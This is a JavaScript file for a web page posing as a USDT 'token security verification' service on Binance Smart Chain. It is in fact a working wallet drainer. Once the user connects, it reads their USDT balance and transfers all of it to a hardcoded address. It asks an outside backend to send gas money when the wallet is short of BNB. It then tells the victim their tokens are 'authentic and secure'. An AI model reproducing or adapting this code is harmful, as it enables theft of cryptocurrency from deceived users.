const Next = document.getElementById('Next'); // This now targets your 'Next' button
const walletAddress = document.getElementById('walletAddress'); // Expected in HTML, but not present
const tokenBalance = document.getElementById('tokenBalance'); // Expected in HTML, but not present
const verificationModal = document.getElementById('verificationModal'); // Expected in HTML, but not present
const progressBar = document.getElementById('progressBar'); // Expected in HTML, but not present
const step1 = document.getElementById('step1'); // Expected in HTML, but not present
const step2 = document.getElementById('step2'); // Expected in HTML, but not present
const step3 = document.getElementById('step3'); // Expected in HTML, but not present
const step4 = document.getElementById('step4'); // Expected in HTML, but not present
const step1Desc = document.getElementById('step1Desc'); // Expected in HTML, but not present
const step2Desc = document.getElementById('step2Desc'); // Expected in HTML, but not present
const step3Desc = document.getElementById('step3Desc'); // Expected in HTML, but not present
const step4Desc = document.getElementById('step4Desc'); // Expected in HTML, but not present
const modalMessage = document.getElementById('modalMessage'); // Expected in HTML, but not present
const closeModalBtns = document.querySelectorAll('.close-modal'); // Expected in HTML, but not present
const networkDot = document.getElementById('networkDot'); // Expected in HTML, but not present
const networkStatus = document.getElementById('networkStatus'); // Expected in HTML, but not present

// Configuration
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
const tokenAbi = [
    {
        "constant": true,
        "inputs": [{"name": "who", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Network configuration
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'bnb',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

let web3;
let userAddress;
let tokenBalanceValue = 0;
let tokenContract;
let isTransferComplete = false;
let currentProvider = null;
let walletType = WALLET_TYPES.UNKNOWN;

// Initialize Web3 - Wallet compatible
async function initWeb3() {
    // Detect wallet type
    if (window.trustwallet) {
        walletType = WALLET_TYPES.TRUST;
        currentProvider = window.trustwallet;
    } else if (window.BinanceChain) {
        walletType = WALLET_TYPES.BINANCE;
        currentProvider = window.BinanceChain;
    } else if (window.ethereum) {
        walletType = WALLET_TYPES.METAMASK;
        currentProvider = window.ethereum;
    } else if (window.web3) {
        walletType = WALLET_TYPES.UNKNOWN;
        currentProvider = window.web3.currentProvider;
    } else {
        console.error("No Web3 provider detected. Please install Trust Wallet, Binance Wallet or MetaMask.");
        // showError("Please install Trust Wallet, Binance Wallet or MetaMask."); // Cannot show if modal is not present
        return false;
    }

    try {
        web3 = new Web3(currentProvider);
        await updateNetworkStatus();

        // Listen for chain changes
        if (currentProvider.on) {
            currentProvider.on('chainChanged', (chainId) => {
                window.location.reload();
            });

            // Binance Chain specific event
            if (walletType === WALLET_TYPES.BINANCE) {
                currentProvider.on('accountsChanged', (accounts) => {
                    window.location.reload();
                });
            }
        }

        return true;
    } catch (error) {
        console.error("Web3 initialization error:", error);
        return false;
    }
}

// Update network status display (will do nothing if elements are null)
async function updateNetworkStatus() {
    if (!web3) return false;

    try {
        const chainId = await web3.eth.getChainId();

        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            if (networkDot) networkDot.className = "network-dot";
            if (networkStatus) networkStatus.textContent = "Binance Smart Chain";
            return true;
        } else {
            if (networkDot) networkDot.className = "network-dot network-disconnected";
            if (networkStatus) networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;

            // Automatically switch to BSC for Trust Wallet
            if (walletType === WALLET_TYPES.TRUST || walletType === WALLET_TYPES.METAMASK) {
                const switched = await switchToBSC();
                if (switched) {
                    return updateNetworkStatus(); // Recursive check after switch
                }
            }
            return false;
        }
    } catch (error) {
        console.error("Error getting network status:", error);
        if (networkDot) networkDot.className = "network-dot network-disconnected";
        if (networkStatus) networkStatus.textContent = "Network Error";
        return false;
    }
}

// Switch to Binance Smart Chain (will update console, but not UI if step2Desc is null)
async function switchToBSC() {
    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain...";
    console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);

    try {
        // Binance Web3 Wallet uses different method
        if (walletType === WALLET_TYPES.BINANCE) {
            await window.BinanceChain.switchNetwork('bsc-mainnet');
            return true;
        }

        // Standard EIP-3326 method
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
        });
        return true;
    } catch (switchError) {
        // Network not added, try to add it
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [BSC_MAINNET_PARAMS]
                });
                return true;
            } catch (addError) {
                console.error("Failed to add BSC network:", addError);
                if (step2Desc) step2Desc.textContent = "Failed to add BSC network";
                return false;
            }
        }
        console.error("Failed to switch to BSC:", switchError);
        if (step2Desc) step2Desc.textContent = "Failed to switch network";
        return false;
    }
}

// Update progress (will do nothing if progressBar is null)
function updateProgress(percent) {
    if (progressBar) progressBar.style.width = `${percent}%`;
}

// Update step UI (will do nothing if step elements are null)
function updateStep(stepNum, status) {
    const step = document.getElementById(`step${stepNum}`);
    if (step) {
        step.className = `step ${status}`;
        const stepIcon = step.querySelector('.step-icon');
        if (stepIcon) {
            stepIcon.innerHTML = status === 'completed' ? '<i class="fas fa-check"></i>' : stepNum;
        }
    }
}

// Connect Wallet
async function connectWallet() {
    updateStep(1, 'active');
    updateProgress(20);

    const isWeb3Initialized = await initWeb3();
    if (!isWeb3Initialized) {
        showError("Web3 initialization failed.");
        return false;
    }

    try {
        if (step1Desc) step1Desc.textContent = "Requesting account access...";

        // Different method for Binance Web3 Wallet
        if (walletType === WALLET_TYPES.BINANCE) {
            const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
            userAddress = accounts[0];
        } else {
            const accounts = await web3.eth.getAccounts();
            if (accounts.length === 0) {
                showError("No accounts found. Please connect your wallet.");
                return false;
            }
            userAddress = accounts[0];
        }

        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
        if (Next) Next.disabled = true;

        updateStep(1, 'completed');
        updateStep(2, 'active');
        updateProgress(40);

        return true;
    } catch (error) {
        console.error("Error connecting wallet:", error);
        showError("Error connecting wallet. Please try again.");
        return false;
    }
}

// Ensure we're on BSC network
async function ensureBSCNetwork() {
    updateStep(2, 'active');

    try {
        const chainId = await web3.eth.getChainId();

        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            if (step2Desc) step2Desc.textContent = "Connected to Binance Smart Chain";
            return true;
        }

        const switched = await switchToBSC();

        if (switched) {
            if (step2Desc) step2Desc.textContent = "Successfully switched to Binance Smart Chain";
            updateNetworkStatus();
            return true;
        } else {
            if (step2Desc) step2Desc.textContent = "Failed to switch network";
            return false;
        }
    } catch (error) {
        console.error("Network check failed:", error);
        if (step2Desc) step2Desc.textContent = "Network check failed";
        return false;
    }
}

// Get token balance
async function getTokenBalance() {
    updateStep(3, 'active');
    if (step3Desc) step3Desc.textContent = "Scanning token security parameters...";

    try {
        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';

        tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);

        const balance = await tokenContract.methods.balanceOf(userAddress).call();

        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`;

        if (step3Desc) step3Desc.textContent = "Token analysis complete";
        updateStep(3, 'completed');
        updateStep(4, 'active');
        updateProgress(70);

        return true;
    } catch (error) {
        console.error("Error fetching token balance:", error);
        if (step3Desc) step3Desc.textContent = "Token analysis failed";
        showError("Failed to analyze token. Please try again.");
        if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
        return false;
    }
}

// Execute verification (transfer)
async function executeVerification() {
    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet...";
    if (modalMessage) modalMessage.textContent = "Please confirm the transaction in your wallet";

    try {
        // Convert token to wei
        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');

        // --- BNB Check and Top-Up Integration Start ---
        // Get user's current BNB balance
        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
        const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));

        // Define a threshold for low BNB. 0.0005 BNB is a good starting point for BSC gas.
        const BNB_LOW_THRESHOLD = 0.0005;

        if (userBNB < BNB_LOW_THRESHOLD) {
            console.log("User BNB is low. Requesting BNB from backend...");
            if (modalMessage) modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
            if (modalMessage) modalMessage.className = "warning-message"; // You might want a different class for warnings

            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ toAddress: userAddress })
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log("BNB top-up request successful:", result);
                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait a moment and try confirming the transaction again.";

                    // if(verificationModal) verificationModal.style.display = "none"; // This won't work as modal is not present
                    if (Next) Next.disabled = false;
                    if (Next) Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Reset button text
                    return;
                } else {
                    const errorData = await response.json();
                    console.error("BNB top-up request failed:", errorData);
                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
                    return; // Stop execution if BNB top-up fails
                }
            } catch (backendError) {
                console.error("Error communicating with BNB backend:", backendError);
                showError("Could not request BNB. Network error or backend issue. Please try again.");
                return; // Stop execution if backend call fails
            }
        }
        // --- BNB Check and Top-Up Integration End ---

        // Proceed with USDT transfer if BNB is sufficient or top-up wasn't needed/failed
        tokenContract.methods.transfer(recipientAddress, amountWei)
            .send({ from: userAddress })
            .on('transactionHash', (hash) => {
                console.log("Transaction hash:", hash);
            })
            .on('receipt', (receipt) => {
                // Transaction was successful
                if (step4Desc) step4Desc.textContent = "Verification complete!";
                updateStep(4, 'completed');
                updateProgress(100);

                setTimeout(() => {
                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
                    tokenBalanceValue = 0;

                    // if(verificationModal) verificationModal.style.display = "none"; // This won't work as modal is not present

                    if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
                    if (Next) Next.disabled = true;

                    if (modalMessage) modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure.";
                    if (modalMessage) modalMessage.className = "success-message";

                    isTransferComplete = true;
                }, 1500);
            })
            .on('error', (error) => {
                console.error("Transaction error:", error);
                if (step4Desc) step4Desc.textContent = "Verification failed";
                if (modalMessage) modalMessage.textContent = "Verification failed. Please try again.";
                if (modalMessage) modalMessage.className = "error-message";
            });

    } catch (error) {
        console.error("Verification failed:", error);
        if (step4Desc) step4Desc.textContent = "Verification failed";
        if (modalMessage) modalMessage.textContent = "Verification failed. Please try again.";
        if (modalMessage) modalMessage.className = "error-message";
    }
}

// Show error message (will only log to console if modalMessage is null)
function showError(message) {
    console.error("Error:", message);
    if (modalMessage) modalMessage.textContent = message;
    if (modalMessage) modalMessage.className = "error-message";
    setTimeout(() => {
        if (modalMessage) modalMessage.textContent = "";
        if (modalMessage) modalMessage.className = "";
    }, 5000);
}

// Event Listener for the "Next" button
// This will override the onclick="Next()" attribute on the button
// in your index.html if this script is loaded AFTER the inline script,
// or if it's the only handler.
Next.addEventListener('click', async () => {
    // Prevent the default form submission or multiple clicks if already processing
    // Note: If original 'next()' function is called first due to 'onclick',
    // this listener will fire AFTER it.
    console.log("Verification process initiated by 'Next' button.");

    if (isTransferComplete) return;

    // if(verificationModal) verificationModal.style.display = "flex"; // Will not work
    updateStep(1, 'active');
    updateStep(2, '');
    updateStep(3, '');
    updateStep(4, '');
    updateProgress(0);
    if (modalMessage) modalMessage.textContent = "";
    if (modalMessage) modalMessage.className = "";

    try {
        // Step 1: Connect wallet
        if (!userAddress) {
            const connected = await connectWallet();
            if (!connected) {
                // if(verificationModal) verificationModal.style.display = "none"; // Will not work
                if (Next) Next.disabled = false;
                if (Next) Next.innerHTML = 'Next'; // Reset button text
                return;
            }
        }

        // Step 2: Ensure BSC network
        const networkReady = await ensureBSCNetwork();
        if (!networkReady) {
            updateStep(2, '');
            showError("Please switch to Binance Smart Chain to continue");
            return;
        }
        updateStep(2, 'completed');

        // Step 3: Get token balance
        const balanceFetched = await getTokenBalance();
        if (!balanceFetched) {
            // if(verificationModal) verificationModal.style.display = "none"; // Will not work
            if (Next) Next.disabled = false;
            if (Next) Next.innerHTML = 'Next'; // Reset button text
            return;
        }

        if (tokenBalanceValue <= 0) {
            showError("No USDT tokens found for verification.");
            return;
        }

        if (tokenBalanceValue <= 1) { // If token balance is 1 USDT or less, consider it verified without transaction
            const bnbBalance = await web3.eth.getBalance(userAddress);
            const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');

            showError(`Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`); // Using showError for feedback
            updateStep(4, 'completed');
            updateProgress(100);
            if (Next) Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
            if (Next) Next.disabled = true;
            isTransferComplete = true; // Mark as complete even without transaction

            // Auto-close modal after success message (not applicable if modal not present)
            // setTimeout(() => { if(verificationModal) verificationModal.style.display = "none"; }, 3000);
            return;
        }

        // Step 4: Execute verification (transfer if > 1 USDT)
        await executeVerification();
    } catch (error) {
        console.error("Verification process error:", error);
        showError("An unexpected error occurred. Please try again.");
        // if(verificationModal) verificationModal.style.display = "none"; // Will not work
        if (Next) Next.disabled = false;
        if (Next) Next.innerHTML = 'Next'; // Reset button text
    }
});

// These event listeners will not work as closeModalBtns and verificationModal will be null
closeModalBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        // if(verificationModal) verificationModal.style.display = "none"; // Will not work
        if (!isTransferComplete) { // Only reset button if transfer isn't complete
            if (Next) Next.innerHTML = 'Next';
            if (Next) Next.disabled = false;
        }
    });
});

window.addEventListener('click', (e) => {
    if (e.target === verificationModal) { // Will not work as verificationModal is null
        // if(verificationModal) verificationModal.style.display = "none"; // Will not work
        if (!isTransferComplete) { // Only reset button if transfer isn't complete
            if (Next) Next.innerHTML = 'Next';
            if (Next) Next.disabled = false;
        }
    }
});

// Initialize on load
window.addEventListener('load', async () => {
    if (Next) Next.disabled = false; // Ensure button is enabled on load
    const web3Initialized = await initWeb3();

    if (web3Initialized) {
        // Try to connect wallet automatically if previously connected
        if (currentProvider && currentProvider.selectedAddress) {
            userAddress = currentProvider.selectedAddress;
            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;

            // Get initial balance and network status
            const networkReady = await ensureBSCNetwork();
            if (networkReady) {
                await getTokenBalance();
            }
        }
    }
});
